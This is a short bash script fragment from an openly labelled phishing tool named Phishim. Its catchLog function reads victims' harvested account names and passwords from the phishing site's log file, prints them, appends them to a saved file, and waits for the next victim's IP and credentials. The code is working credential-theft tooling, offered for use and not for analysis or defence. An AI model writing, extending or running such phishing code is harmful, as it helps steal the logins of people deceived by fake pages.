#!/bin/bash

# Tool Name: Phishim
# Tool URI: https://github.com/SullFurix/Phishim/
# Description: Phishim is a phishing tool.
# Version: 4.0.0
# Author: SullFurix
# Author URI: https://github.com/SullFurix/
# Copyright: © 2020 SullFurix.
# License: GNU General Public License v3.0
# License URI: http://www.gnu.org/licenses/gpl-3.0.html

catchLog() {

  account=$(grep -o 'Account:.*' web/$server/usernames.txt | cut -d " " -f2)
  IFS=$'\n'
  password=$(grep -o 'Pass:.*' web/$server/usernames.txt | cut -d ":" -f2)
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Account:\e[0m\e[1;77m %s\n\e[0m" $account
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
  cat web/$server/usernames.txt >> web/$server/saved.usernames.txt
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m sites/%s/saved.usernames.txt\e[0m\n" $server
  printf "\n"
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Next IP and Next Credentials, Press Ctrl + C to exit...\e[0m\n"

}
